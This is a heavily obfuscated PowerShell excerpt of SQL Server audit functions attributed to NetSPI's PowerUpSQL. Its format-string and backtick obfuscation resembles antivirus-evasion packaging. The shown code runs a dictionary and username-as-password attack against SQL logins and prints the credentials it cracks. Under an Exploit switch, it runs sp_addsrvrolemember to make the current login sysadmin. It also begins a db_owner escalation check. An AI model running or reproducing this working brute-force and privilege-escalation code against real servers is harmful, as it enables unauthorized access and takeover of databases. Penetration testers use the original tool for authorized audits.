        ${E`x`PLoIT`CmD}    = ("{17}{12}{11}{2}{0}{7}{13}{1}{20}{5}{6}{15}{4}{18}{19}{21}{16}{8}{10}{14}{9}{3}"-f' credenti','to','d','it.','or re','he SQL ','Serv','als to lo','mand wi','lo','th',' affecte',' the','g in',' -Exp','er, ','com','Use','ru','n this',' t',' ')
        ${D`etAi`ls}       = ''
        ${refE`R`E`NCe}     = ("{7}{8}{0}{6}{11}{5}{2}{9}{13}{1}{4}{12}{14}{3}{10}" -f'/','lib','crosoft','61959.as','ra','.mi','/msd','htt','ps:','.co','px','n','ry','m/en-us/','/ms1')
        ${a`UTh`oR}        = ("{6}{1}{8}{3}{5}{2}{4}{0}{7}"-f ' NetSPI ','Sut','(@_nullbind)','rl',',','and ','Scott ','2016','he')

        
        
        
        

        
        ${l`Og`iNLIst} = @()
        ${pAS`S`w`O`RdLIst} = @()

        
        if(${US`ERFI`Le})
        {
            &("{1}{2}{0}{3}{4}"-f'e-','Wr','it','Ve','rbose') -Message ("$Instance "+'- '+'Gettin'+'g '+'l'+'o'+'gins '+'f'+'rom '+'f'+'i'+'le...')
            &("{2}{1}{0}" -f'tent','t-Con','Ge') -Path ${USER`F`iLE} |
            &("{3}{1}{0}{2}{4}"-f'-O','ch','bje','ForEa','ct') -Process {
                ${log`INLI`sT} += ${_}
            }
        }

        
        if(${TES`T`Us`e`RnamE})
        {
            &("{0}{4}{1}{2}{3}"-f'W','i','te-Verb','ose','r') -Message ("$Instance "+'- '+'Getting'+' '+'supp'+'lie'+'d '+'login'+'.'+'..')
            ${lO`G`iNl`IsT} += ${tEst`USer`N`A`me}
        }

        
        if(-not ${NOU`SerE`NuM})
        {
            
            ${TE`sTc`on`Necti`ON} = &("{5}{0}{2}{1}{4}{3}"-f 't-S','ecti','QLConn','nTest','o','Ge') -Instance ${ins`TA`N`CE} -Username ${u`Se`RnaME} -Password ${P`As`sworD} -Credential ${Cr`e`DENTiaL} -SuppressVerbose | &("{1}{2}{0}{3}"-f '-Obje','Wher','e','ct') -FilterScript {
                ${_}."Stat`US" -eq ("{1}{2}{0}" -f'ble','A','ccessi')
            }
            if(${Te`Stc`ONnECTIon})
            {
                
                ${IS`Sy`SA`dmiN} = &("{1}{5}{3}{2}{0}{4}" -f 'hec','Get','inC','LSysadm','k','-SQ') -Instance ${iN`St`ANCE} -Credential ${cr`EDeNt`IAl} -Username ${Use`RnA`me} -Password ${PaS`S`wo`Rd} -SuppressVerbose | &("{1}{2}{0}{3}" -f 'Obje','S','elect-','ct') -Property ("{2}{1}{0}"-f 'admin','ys','IsS') -ExpandProperty ("{3}{2}{1}{0}" -f 'admin','s','y','IsS')
                if(${is`SY`sAdmIn} -eq 'Yes')
                {
                    
                    &("{3}{0}{1}{2}"-f'e-V','erb','ose','Writ') -Message ("$Instance "+'- '+'Ge'+'tti'+'ng '+'l'+'ist '+'o'+'f '+'l'+'ogins..'+'.')
                    &("{3}{5}{1}{0}{4}{2}" -f 'LSer','-SQ','gin','G','verLo','et') -Instance ${InSt`A`NCe} -Username ${usE`Rna`me} -Password ${p`ASSwO`RD} -Credential ${C`ReD`ENtIAl} -SuppressVerbose |
                    &("{1}{2}{0}"-f '-Object','Whe','re') -FilterScript {
                        ${_}."pRIncIPa`LT`yPE" -eq ("{2}{1}{0}"-f'N','L_LOGI','SQ')
                    } |
                    &("{3}{2}{1}{0}" -f 'ject','Ob','lect-','Se') -Property ("{1}{2}{3}{0}"-f 'Name','Pri','nci','pal') -ExpandProperty ("{3}{1}{0}{2}"-f'Nam','ipal','e','Princ') |
                    &("{0}{3}{1}{2}"-f'F','-Objec','t','orEach') -Process {
                        ${lOG`I`NlIST} += ${_}
                    }
                }
                else
                {
                    
                    &("{1}{2}{0}{3}"-f 'b','Write-','Ver','ose') -Message ("$Instance "+': '+'En'+'umera'+'ti'+'ng '+'princ'+'i'+'pal '+'n'+'am'+'es '+'fro'+'m '+"$FuzzNum "+'prin'+'cipa'+'l '+'IDs.'+'.')
                    &("{1}{4}{5}{3}{2}{0}" -f'in','Ge','verLog','r','t-SQLFuzzS','e') -Instance ${InS`TaN`CE} -GetPrincipalType -Username ${User`NaMe} -Password ${PA`s`swOrd} -Credential ${c`REdent`I`AL} -FuzzNum ${fu`ZZn`UM} -SuppressVerbose |
                    &("{0}{1}{2}"-f 'Whe','re-Ob','ject') -FilterScript {
                        ${_}."pr`InCi`plEtY`PE" -eq ("{0}{1}{2}" -f 'SQL L','og','in')
                    } |
                    &("{0}{2}{1}{3}" -f'S','t-','elec','Object') -Property ("{2}{0}{1}"-f'eNam','e','Principl') -ExpandProperty ("{2}{4}{0}{3}{1}" -f 'e','e','Prin','Nam','cipl') |
                    &("{0}{1}{2}{3}"-f'ForE','ach-','O','bject') -Process {
                        ${lOg`in`lI`ST} += ${_}
                    }
                }
            }
            else
            {
                if( -not ${s`UPp`RESS`VerB`ose})
                {
                    &("{2}{1}{0}" -f'se','erbo','Write-V') -Message ("$Instance "+'- '+'Con'+'ne'+'ction'+' '+'F'+'ailed '+'- '+'Could'+' '+'no'+'t '+'authe'+'n'+'ticate '+'w'+'ith '+'pr'+'ovi'+'ded '+'c'+'r'+'ede'+'ntials.')
                }
                return
            }
        }

        
        if(${l`OG`iNlISt}."C`oUNT" -eq 0 -and (-not ${FUZ`ZLo`GinS}))
        {
            &("{3}{0}{2}{1}" -f'e-V','rbose','e','Writ') -Message ("$Instance "+'- '+'N'+'o '+'login'+'s '+'ha'+'ve '+'bee'+'n '+'p'+'r'+'ovided.')
            return
        }

        
        if(${p`ASsFilE})
        {
            &("{1}{2}{3}{0}"-f'Verbose','Wri','te','-') -Message ("$Instance "+'- '+'Ge'+'ttin'+'g '+'passw'+'ord '+'fr'+'om '+'file.'+'..')
            &("{1}{2}{0}"-f 'ntent','Ge','t-Co') -Path ${PA`ss`FILe} |
            &("{3}{2}{1}{0}" -f 't','c','rEach-Obje','Fo') -Process {
                ${pAs`sw`o`RdlIst} += ${_}
            }
        }

        
        if(${tE`STPAss`wO`RD})
        {
            &("{0}{2}{1}"-f'Write-','se','Verbo') -Message ("$Instance "+'- '+'Get'+'ting '+'supp'+'l'+'ied '+'passwo'+'rd'+'..'+'.')
            ${paSS`WorDli`sT} += ${T`Est`PA`SsW`ORD}
        }

        
        if(${paSs`wOrdLI`st}."c`OuNt" -eq 0 -and (${no`USeR`ASPasS}))
        {
            &("{2}{1}{0}"-f'se','te-Verbo','Wri') -Message ("$Instance "+'- '+'N'+'o '+'passwo'+'rds'+' '+'ha'+'ve '+'been'+' '+'prov'+'id'+'ed.')
            return
        }

        
        &("{2}{3}{4}{0}{1}"-f'-Ver','bose','W','r','ite') -Message ("$Instance "+'- '+'Per'+'formi'+'n'+'g '+'dict'+'io'+'nary '+'at'+'tack'+'.'+'..')
        ${lo`g`inLI`sT} |
        &("{1}{2}{0}" -f'bject','Sele','ct-O') -Unique |
        &("{3}{1}{0}{2}" -f'-Obje','rEach','ct','Fo') -Process {
            ${tar`GET`LogIN} = ${_}
            ${PASs`W`oRdL`i`sT} |
            &("{2}{0}{1}"-f 'ect-Objec','t','Sel') -Unique |
            &("{2}{0}{1}{4}{3}"-f 'rEa','ch-O','Fo','ect','bj') -Process {
                ${t`ArGeTp`As`S`WORd} = ${_}

                ${Te`STPASS} = &("{3}{4}{2}{0}{5}{1}" -f 'c','Test','e','Get-S','QLConn','tion') -Instance ${inS`Ta`N`Ce} -Username ${t`A`RgeTlog`in} -Password ${T`A`RGetPAS`SwoRd} -SuppressVerbose |
                &("{0}{3}{2}{1}" -f 'Wher','Object','-','e') -FilterScript {
                    ${_}."stAt`US" -eq ("{0}{1}{2}" -f 'A','ccess','ible')
                }
                if(${t`EsTPa`SS})
                {
                    
                    ${iSS`y`SaDmIN} = &("{4}{3}{0}{2}{1}"-f'QL','eck','SysadminCh','S','Get-') -Instance ${IN`sTa`Nce} -Credential ${c`RE`DEnTial} -Username ${t`A`R`GETLogin} -Password ${TA`RGet`p`As`SWoRd} -SuppressVerbose |
                    &("{2}{3}{0}{1}" -f 'Ob','ject','Sel','ect-') -Property ("{0}{2}{1}" -f'Is','n','Sysadmi') -ExpandProperty ("{2}{0}{1}"-f 'sS','ysadmin','I')
                    if(${i`sSySaD`mIN} -eq 'Yes')
                    {
                        ${sYSa`D`MIn`s`TaTus} = ("{1}{0}" -f'admin','Sys')
                    }
                    else
                    {
                        ${SYs`A`DMI`N`statuS} = ("{2}{1}{0}" -f 'in','dm','Not Sysa')
                    }

                    &("{1}{2}{0}" -f'e','Write-Verb','os') -Message ("$Instance "+'- '+'S'+'ucc'+'essful'+' '+'Login'+': '+'Use'+'r '+'= '+"$TargetLogin "+"($SysadminStatus) "+'Pas'+'swo'+'rd '+'= '+"$TargetPassword")

                    if(${explO`It})
                    {
                        &("{0}{1}{2}"-f 'W','rite-Verbo','se') -Message ("$Instance "+'- '+'Try'+'in'+'g '+'t'+'o '+'make'+' '+'you'+' '+'a '+'s'+'y'+'s'+'admin...')

                        
                        ${is`Sy`S`ADmin1} = &("{1}{0}{4}{5}{3}{2}" -f 't-SQL','Ge','eck','h','Sys','adminC') -Instance ${i`N`sTANcE} -Credential ${cR`e`d`enTIaL} -Username ${USe`RN`AmE} -Password ${pAS`sWo`RD} -SuppressVerbose |
                        &("{2}{0}{1}"-f'je','ct','Select-Ob') -Property ("{3}{0}{1}{2}"-f'sSysa','dm','in','I') -ExpandProperty ("{0}{2}{1}" -f 'Is','sadmin','Sy')
                        if(${i`SSYsA`dmin1} -eq 'Yes')
                        {
                            &("{1}{0}{3}{2}" -f'Ve','Write-','e','rbos') -Message ("$Instance "+'- '+('You'+'{0}r'+'e ')  -f  [CHaR]39+'alre'+'a'+'dy '+'a '+'sys'+'admin'+'. '+'Not'+'hing'+' '+'to'+' '+'do'+'.')
                        }
                        else
                        {
                            &("{2}{0}{1}" -f 'te-Verbo','se','Wri') -Message ("$Instance "+'- '+(('Y'+'ouQV'+'7re ') -CrEplaCE  ([char]81+[char]86+[char]55),[char]39)+'not'+' '+'curr'+'entl'+'y'+' '+'a '+'sy'+'sad'+'min. '+('Le'+'tDhgs ')."rEp`L`AcE"(([cHAr]68+[cHAr]104+[cHAr]103),[StriNG][cHAr]39)+'ch'+'a'+'nge '+'that'+'..'+'.')

                            
                            &("{1}{2}{0}{3}"-f 'u','G','et-SQLQ','ery') -Instance ${INsT`AN`CE} -Username ${tarGETL`oG`iN} -Password ${TarG`E`Tpas`sWOrd} -Credential ${c`REd`eNTIAL} -Query ('EXE'+'C '+'sp'+'_'+'add'+'srvro'+'lemem'+'ber '+"'$CurrentLogin','sysadmin'") -SuppressVerbose

                            
                            ${ISsyS`ADM`IN2} = &("{1}{3}{0}{2}" -f 'ysadminCh','Get-','eck','SQLS') -Instance ${i`NstA`N`CE} -Credential ${cR`e`Dent`IAL} -Username ${Usern`A`me} -Password ${pA`ss`WorD} -SuppressVerbose |
                            &("{0}{2}{1}" -f'S','ct-Object','ele') -Property ("{0}{3}{1}{2}"-f'Is','ysad','min','S') -ExpandProperty ("{2}{1}{0}"-f'n','sSysadmi','I')
                            if(${is`SysaDmI`N2} -eq 'Yes')
                            {
                                ${ExPL`oiT`ED} = 'Yes'
                                &("{0}{3}{1}{2}"-f'Wri','s','e','te-Verbo') -Message ("$Instance "+'- '+'SU'+'C'+'CESS'+'! '+('Y'+'o'+'uG'+'e4re ')."r`ePLa`CE"(([ChAR]71+[ChAR]101+[ChAR]52),[String][ChAR]39)+'a '+'sys'+'ad'+'min '+'n'+'ow.')
                            }
                            else
                            {
                                ${ex`p`LoiTEd} = 'No'
                                &("{0}{2}{1}"-f 'W','-Verbose','rite') -Message ("$Instance "+'- '+'Fa'+'il. '+'We'+' '+('coudnXl'+'k'+'t ')."replA`cE"(([cHar]88+[cHar]108+[cHar]107),[STrInG][cHar]39)+'add'+' '+'y'+'ou '+'a'+'s '+'a '+'sysadmi'+'n'+'.')
                            }
                        }
                    }

                    
                    ${deta`ILS} = ('Th'+'e '+"$TargetLogin "+"($SysadminStatus) "+'is'+' '+'co'+'nfigur'+'ed '+'with'+' '+'the'+' '+'p'+'ass'+'word'+' '+"$TargetPassword.")
                    ${isVu`L`NeRAB`Le} = 'Yes'
                    ${i`seXP`Loi`TAbLE} = 'Yes'
                    ${Nu`Ll} = ${t`B`lData}."r`oWS".("{0}{1}" -f 'Ad','d').Invoke(${CoMpUT`e`R`NAMe}, ${I`NsTA`NCE}, ${V`UlnERAB`il`i`TY}, ${DeScRI`p`T`Ion}, ${rEM`EdIa`T`Ion}, ${se`VeRi`TY}, ${I`SvuL`Nerab`lE}, ${IS`EX`PLOiTA`B`le}, ${exP`l`oiTED}, ${EX`PLO`ITcMd}, ${dEt`Ai`LS}, ${r`EF`er`enCe}, ${AU`T`hor})
                }
                else
                {
                    &("{2}{1}{0}"-f'se','bo','Write-Ver') -Message ("$Instance "+'- '+'Fai'+'led'+' '+'L'+'ogin:'+' '+'U'+'ser '+'= '+"$TargetLogin "+'Pas'+'s'+'word '+'= '+"$TargetPassword")
                }
            }
        }

        
        if(-not ${nOusE`RAsp`ASS})
        {
            ${lOG`i`NlIst} |
            &("{3}{1}{2}{0}" -f't','ct-O','bjec','Sele') -Unique |
            &("{0}{2}{1}{3}"-f'ForEa','h','c','-Object') -Process {
                ${TA`RgetlO`GiN} = ${_}
                ${T`e`STPaSS} = &("{3}{0}{1}{2}{5}{4}" -f'C','onn','e','Get-SQL','Test','ction') -Instance ${i`NS`TANce} -Username ${TaR`getl`O`giN} -Password ${TARG`e`Tlo`GIn} -SuppressVerbose |
                &("{2}{1}{0}" -f'ect','ere-Obj','Wh') -FilterScript {
                    ${_}."s`TAt`US" -eq ("{0}{2}{1}"-f'Acces','le','sib')
                }
                if(${TeSTP`A`SS})
                {
                    
                    ${ISS`YsA`DmIn3} = &("{3}{2}{1}{4}{0}"-f'Check','ysad','S','Get-SQL','min') -Instance ${In`ST`AnCE} -Credential ${cr`E`deNtIAl} -Username ${TaRg`e`Tl`Ogin} -Password ${T`AR`gEtloG`iN} -SuppressVerbose |
                    &("{1}{0}{2}"-f'ect-','Sel','Object') -Property ("{1}{0}{2}" -f'ysa','IsS','dmin') -ExpandProperty ("{2}{1}{3}{0}" -f 'in','s','IsSy','adm')
                    if(${Is`sYSadmi`N3} -eq 'Yes')
                    {
                        ${SYS`AdMInS`TaT`Us} = ("{2}{0}{1}"-f 'ysadmi','n','S')
                    }
                    else
                    {
                        ${Sys`ADmInS`TaT`Us} = ("{2}{0}{1}{3}"-f' ','Sysadm','Not','in')
                    }

                    &("{0}{2}{1}"-f'Write-Ver','ose','b') -Message ("$Instance "+'- '+'Suc'+'ce'+'ssful '+'L'+'ogin: '+'U'+'ser '+'= '+"$TargetLogin "+"($SysadminStatus) "+'Pa'+'sswo'+'rd '+'= '+"$TargetLogin")

                    if((${eXPlo`it}) -and ${iS`S`ySa`DmIN3} -eq 'Yes')
                    {
                        
                        ${IsSYs`AD`MIn4} = &("{0}{2}{5}{4}{3}{1}" -f'Get','Check','-SQ','min','ysad','LS') -Instance ${INSta`NCE} -Credential ${Cr`eDe`NTIal} -Username ${U`S`eRN`AMe} -Password ${pa`SsW`oRD} -SuppressVerbose |
                        &("{1}{2}{3}{0}" -f't','S','elect','-Objec') -Property ("{1}{2}{0}" -f 'in','IsSy','sadm') -ExpandProperty ("{0}{3}{2}{1}"-f 'IsS','in','dm','ysa')
                        if(${I`SsY`s`ADMin4} -eq 'Yes')
                        {
                            &("{2}{0}{1}" -f'-Verb','ose','Write') -Message ("$Instance "+'- '+(('YouLbyre'+' ')  -cRePlace  ([CHar]76+[CHar]98+[CHar]121),[CHar]39)+'al'+'ready'+' '+'a '+'sysad'+'mi'+'n'+'. '+'N'+'othi'+'ng '+'to'+' '+'do'+'.')
                        }
                        else
                        {
                            &("{0}{1}{2}{3}" -f 'Wr','i','te-V','erbose') -Message ("$Instance "+'- '+('You{'+'0}'+'re ')  -f  [CHAr]39+'no'+'t '+'curr'+'e'+'ntly '+'a '+'sys'+'admin'+'. '+('Let{'+'0}s ') -f  [char]39+'c'+'h'+'ange '+'t'+'hat...')

                            
                            &("{3}{0}{1}{2}"-f'-S','QLQue','ry','Get') -Instance ${insta`NCe} -Username ${TaRg`eT`L`ogIN} -Password ${TARge`T`l`OGin} -Credential ${cReDen`T`I`AL} -Query ('EXEC'+' '+'s'+'p'+'_addsrvrol'+'e'+'me'+'mber '+"'$CurrentLogin','sysadmin'") -SuppressVerbose

                            
                            ${ISSyS`ADM`i`N5} = &("{1}{3}{0}{2}" -f'a','Get-SQ','dminCheck','LSys') -Instance ${iN`sTAn`Ce} -Credential ${cREdEnt`I`AL} -Username ${USE`Rn`AmE} -Password ${pa`SS`Word} -SuppressVerbose |
                            &("{0}{1}{2}{3}" -f 'S','elec','t-Ob','ject') -Property ("{2}{1}{0}" -f'admin','s','IsSy') -ExpandProperty ("{3}{2}{0}{1}" -f'dmi','n','sSysa','I')
                            if(${iS`sYSa`DMIn5} -eq 'Yes')
                            {
                                ${e`XP`LoITed} = 'Yes'
                                &("{0}{3}{1}{2}"-f 'Write-V','rbo','se','e') -Message ("$Instance "+'- '+'SU'+'CCESS'+'! '+(('Y'+'ouP9'+'Jre ')  -rEPLAce 'P9J',[ChAR]39)+'a '+'sysadmi'+'n'+' '+'now'+'.')
                            }
                            else
                            {
                                ${eX`PloI`TEd} = 'No'
                                &("{0}{1}{2}"-f'Wr','ite-Ve','rbose') -Message ("$Instance "+'- '+'Fa'+'il. '+'W'+'e '+('cou'+'dn{0}t'+' ')  -f  [ChaR]39+'ad'+'d '+'y'+'ou '+'a'+'s '+'a '+'sys'+'a'+'dmin.')
                            }
                        }
                    }

                    
                    ${D`E`TAiLs} = ('T'+'he '+"$TargetLogin "+"($SysadminStatus) "+'pri'+'nc'+'ipal'+' '+'is'+' '+'con'+'figure'+'d '+'wit'+'h '+'th'+'e '+'passw'+'ord '+"$TargetLogin.")
                    ${iS`VulNer`Ab`Le} = 'Yes'
                    ${iSEXplOi`TA`B`lE} = 'Yes'
                    ${n`Ull} = ${TBl`Da`Ta}."rO`wS".("{0}{1}" -f'Ad','d').Invoke(${com`pUtERn`AMe}, ${IN`sTa`NcE}, ${vu`lneR`A`BiliTY}, ${de`sC`RIp`TION}, ${RemedIat`i`oN}, ${S`e`VeRitY}, ${i`SVUlner`ABLE}, ${i`SExp`l`O`ITabLE}, ${eX`p`LOITeD}, ${E`xPLoiT`cMD}, ${deT`AILS}, ${RE`FEren`cE}, ${A`Uth`or})
                }
                else
                {
                    &("{4}{3}{2}{0}{1}"-f'Ver','bose','-','rite','W') -Message ("$Instance "+'- '+'F'+'ail'+'ed '+'Log'+'in: '+'U'+'ser '+'= '+"$TargetLogin "+'P'+'assw'+'ord '+'= '+"$TargetLogin")
                }
            }
        }


        
        
        
        
        
        


        
        
        
        
        

        
        &("{0}{2}{1}"-f 'Write-V','se','erbo') -Message ("$Instance "+': '+'COMPL'+'E'+'TED'+' '+'V'+'ULNER'+'ABILITY '+'CH'+'E'+'CK: '+'W'+'eak '+'Logi'+'n '+'P'+'assw'+'ord')
    }

    End
    {
        
        if ( -not ${N`ooUt`PUT})
        {
            Return ${tBL`dA`Ta} | &("{0}{2}{1}"-f'So','-Object','rt') -Property ("{0}{1}{2}" -f 'computern','a','me'), ("{2}{0}{1}"-f 'anc','e','inst'), ("{0}{1}{2}" -f 'd','etail','s')
        }
    }
}






Function iNvoke-`s`QLaUDItR`OLe`dbO`WNeR
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdATory = ${Fa`Lse},
                VAluefROmpIPEliNEbYpROperTynaME = ${t`RuE},
        hELPMesSaGE = {"{10}{9}{5}{4}{2}{8}{3}{7}{11}{0}{1}{6}"-f 'ntica','te wit','in','ount t',' doma','r or','h.','o aut',' acc','ve','SQL Ser','he'})]
        [string]${us`eRna`me},

        [Parameter(mandatORy = ${Fa`lSE},
                ValUEfRoMpIpELInebYPRoPErtYNAmE = ${Tr`UE},
        helPMEssAGe = {"{3}{8}{1}{4}{2}{0}{6}{5}{9}{7}"-f'i','r','ma','S',' or do','to a','n account password ','with.','QL Serve','uthenticate '})]
        [string]${P`ASsW`oRd},

        [Parameter(maNDaToRy = ${fa`LSe},
                VALueFROmPipEliNEBYPROperTyNamE = ${T`RUe},
        HELpmEssage = {"{2}{4}{1}{5}{6}{3}{0}"-f '.','do','Wi','als','n','ws credent','i'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`Ed`eNTI`Al} =   (VArIABle ("045"+"9M2") ).vaLUE::"e`mpty",

        [Parameter(maNDatOry = ${F`A`lSE},
                VALuEfROMPIpElineBYPrOpErtYNaMe = ${tR`Ue},
        heLpMessaGe = {"{6}{1}{2}{4}{5}{0}{3}"-f 'n ','ver ins','tance to','to.',' ','connectio','SQL Ser'})]
        [string]${in`S`TAnce},

        [Parameter(MandaToRy = ${fa`lSE},
        helpMesSAGE = {(("{1}{0}{4}{6}{5}{2}{3}"-f 'onL','D','a','nything.','9bt out','ut ','p')) -crEPlAcE  'L9b',[ChAr]39})]
        [string]${NO`oUtP`Ut},

        [Parameter(maNDatOrY = ${fA`lse},
        hELPMEssagE = {"{6}{2}{7}{3}{1}{5}{0}{4}" -f 'e issu','ln','l','it vu','es.','erabl','Exp','o'})]
        [switch]${ExP`LoIt}
    )

    Begin
    {
        
        ${TBlD`A`Ta} = &("{0}{2}{1}" -f 'Ne','bject','w-O') -TypeName ("{4}{0}{2}{5}{3}{1}"-f 'stem.D','le','a','a.DataTab','Sy','t')
        ${N`UlL} = ${tBLd`AtA}."C`OlUMnS".("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{2}{0}"-f 'e','ompu','terNam','C'))
        ${NU`ll} = ${Tb`LdA`Ta}."Co`LUmNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}"-f 'ta','Ins','nce'))
        ${Nu`Ll} = ${TB`LDa`TA}."c`o`lUmns".("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{1}"-f'nerabilit','y','Vul'))
        ${NU`ll} = ${tB`lDaTA}."coLum`Ns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}{3}" -f 'scr','De','iptio','n'))
        ${nu`LL} = ${tblD`A`TA}."co`lU`MnS".("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{3}{2}"-f'Reme','diat','n','io'))
        ${N`UlL} = ${TBl`da`TA}."CO`LumNS".("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f 'Seve','ity','r'))
        ${Nu`Ll} = ${TBl`Da`Ta}."CoLu`MNs".("{1}{0}" -f 'd','Ad').Invoke(("{2}{3}{0}{1}" -f'nera','ble','IsVu','l'))
        ${N`ULl} = ${T`BLda`Ta}."Col`UM`Ns".("{1}{0}"-f'dd','A').Invoke(("{0}{2}{1}"-f'IsExplo','e','itabl'))
        ${nu`Ll} = ${TbldA`TA}."cOLu`mns".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}"-f'Exp','loi','ted'))
        ${nu`Ll} = ${tbL`DA`TA}."CoLUM`NS".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}" -f'loitCmd','p','Ex'))
        ${Nu`Ll} = ${TbL`dA`TA}."COlu`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}" -f 'Det','ails'))
        ${N`UlL} = ${TB`ld`Ata}."co`luMnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}" -f 'ce','Refere','n'))
        ${N`ULL} = ${Tb`L`Data}."coL`UMNS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}"-f 'uthor','A'))
    }

    Process
    {
        
        &("{2}{1}{0}"-f '-Verbose','rite','W') -Message ("$Instance "+': '+'S'+'TART '+'VU'+'L'+'NERAB'+'I'+'LITY '+'CH'+'ECK'+': '+'DATABAS'+'E '+'ROL'+'E '+'- '+'DB_'+'O'+'WNER')

        
        ${tEstc`o`NNEcT`iON} = &("{3}{1}{2}{0}" -f'onTest','-SQLConnec','ti','Get') -Instance ${i`Ns`Ta`Nce} -Username ${uSE`RN`Ame} -Password ${PAs`sw`ord} -Credential ${CRedE`N`TIAl} -SuppressVerbose | &("{1}{2}{3}{0}"-f 'ct','Whe','re-','Obje') -FilterScript {
            ${_}."s`Tatus" -eq ("{2}{0}{1}"-f 'sibl','e','Acces')
        }
        if(-not ${Test`cOnneCt`ION})
        {
            
            &("{1}{2}{4}{3}{0}" -f'rbose','Wri','te-','e','V') -Message ("$Instance "+': '+'CONNE'+'CTION'+' '+'F'+'AILED')
            &("{2}{0}{1}{3}"-f 'ite','-Verbos','Wr','e') -Message ("$Instance "+': '+'C'+'OMPLETED'+' '+'VU'+'L'+'NERABI'+'LI'+'TY '+'CHEC'+'K: '+'DAT'+'ABA'+'SE '+'ROL'+'E '+'- '+'DB_O'+'W'+'NER')
            Return
        }
        else
        {
            &("{0}{1}{2}" -f'Writ','e-Ver','bose') -Message ("$Instance "+': '+'CON'+'NECTI'+'ON '+'SUC'+'CESS')
        }

        
        ${S`ERv`Er`INFO} = &("{0}{2}{4}{1}{3}{5}" -f 'Ge','S','t','Q','-','LServerInfo') -Instance ${i`NsT`Ance} -Username ${usE`Rn`Ame} -Password ${pass`wo`Rd} -Credential ${c`REDE`N`TIal} -SuppressVerbose
        ${c`OMP`UTe`RN`AmE} = ${s`eRVer`iNfO}."C`o`mPUtE`RnamE"
        ${CUr`RE`N`TlOGIn} = ${Ser`Ver`INfO}."Curr`ENtL`ogIN"
        ${CUrre`N`TLOGi`NroLEs} = &("{3}{1}{0}{2}" -f'QLSe','et-S','rverRoleMember','G') -Instance ${IN`S`TAnCE} -Username ${U`seR`NamE} -Password ${P`ASSw`OrD} -Credential ${crE`DEnTI`AL} -PrincipalName ${CuRrE`NTl`oGIN}  -SuppressVerbose
        ${C`Ur`Re`NTpRI`NCpalLI`st} = @()
        ${CuRrENt`P`RInc`p`AL`l`ISt} += ${Cu`R`RentLogiN}
        ${C`U`RrE`NTPR`IN`c`PalLiSt} += ("{0}{1}"-f'Pub','lic')
        ${CURR`en`T`LOG`iNROLEs} | &("{2}{1}{0}"-f'Object','orEach-','F') -Process {
            ${c`U`R`Re`NtprI`NCpaL`LIST} += ${_}."Ro`LE`PrIncip`AlnaMe"
        }

        
        
        
        if(${E`x`PLOit})
        {
            ${TE`sT`Mode}  = ("{2}{1}{0}" -f't','loi','Exp')
        }
        else
        {
            ${t`E`STmODE}  = ("{1}{0}" -f'udit','A')
        }
        ${vu`lN`e`RABILItY} = ("{2}{4}{3}{5}{0}{1}" -f' DB','_OWNER','DATAB','SE','A',' ROLE -')
        ${DEsCr`iPT`i`on}   = ("{1}{30}{17}{37}{24}{25}{5}{12}{16}{32}{27}{36}{31}{38}{4}{34}{8}{3}{10}{19}{26}{35}{41}{20}{7}{2}{6}{14}{40}{11}{33}{39}{9}{18}{0}{28}{23}{29}{15}{21}{22}{13}"-f'ned ','Th','he affected','n to ','llow','OWER r',' da','min if t','e logi','ed and','e',' ','ole ','min.','tabase','ys','in one o',' log',' ow','scalate pr','sysad','a','d','a ','has the',' DB_','i','mor','by ','s','e','s.  Thi','r ','are t',' th','v','e database','in ','s may a','rust','s','ileges to ')
        ${rE`MEd`IA`TIon}   = ((("{27}{2}{45}{12}{24}{17}{7}{6}{44}{30}{42}{43}{8}{29}{32}{11}{34}{1}{22}{31}{18}{21}{35}{23}{5}{28}{19}{38}{3}{10}{0}{40}{13}{37}{39}{14}{33}{20}{4}{47}{26}{16}{25}{46}{15}{9}{36}{41}{48}" -f' be removed wi','lik','t','nd ',' sp','er {','e it.  Pe','ired remov','te','}','can','a comman','e permissi',' a','mand','NER{0}, {0',' {','ot requ','EC sp_','ER{','ke:  EXEC','a','e: ','b','on is n','0','mber','If ','0}DB_OWN','d w','mis','EX','ith ',' li','d ','ddrolemem','MyDbUs',' c','0}, {0}MyDbUser{0}, a','om','th','e','sions are',' gran','r','h','}DB_OW','_droproleme','r{0}')) -f [ChAR]39)
        ${s`EvE`Rity}      = ("{1}{0}"-f'ium','Med')
        ${i`SVu`lN`eraB`lE}  = 'No'
        ${isE`xPLoi`T`ABLE} = 'No'
        ${E`xPl`Oit`ed}     = 'No'
        if(${uSe`RNA`mE})
        {
            ${e`xPl`Oit`cmD}    = ('I'+'nvok'+'e-'+'SQ'+'LAuditRo'+'le'+'Db'+'Ow'+'ner '+'-Inst'+'a'+'nce '+"$Instance "+'-Us'+'erna'+'me '+"$Username "+'-Passwo'+'rd'+' '+"$Password "+'-E'+'xplo'+'it')
        }
        else
        {
            ${EXP`Lo`itC`MD}    = ('Invok'+'e-S'+'QLAud'+'itRoleDb'+'Ow'+'ner '+'-I'+'nstanc'+'e '+"$Instance "+'-Exp'+'loi'+'t')
        }
        ${D`eTa`ILS}       = ''
        ${DePE`ND`ANc`iES} = ("{8}{0}{6}{1}{7}{2}{10}{3}{12}{4}{9}{11}{5}" -f'd ','aba','es must b','ne','sad','d.','dat','s','Affecte','min','e ow',' and be truste','d by a sy')
        ${R`ef`eRENCe}     = ("{23}{17}{11}{9}{10}{6}{22}{16}{8}{13}{15}{3}{18}{0}{4}{24}{20}{5}{7}{19}{21}{1}{12}{2}{14}"-f 'spx','s/','ry/ms187861','ry/ms',',https','msdn.mi','n.','crosoft.com/e','m','/','msd','/','libra','/en-us/li','.aspx','bra','oft.co','s:','189121.a','n','//','-u','micros','http',':')
        ${A`UT`hOr}        = (("{7}{3}{6}{2}{0}{1}{4}{5}" -f'@_','nullbind), ','(','land','NetSPI ','2016',' ','Scott Suther'))

        
        
        
        

        
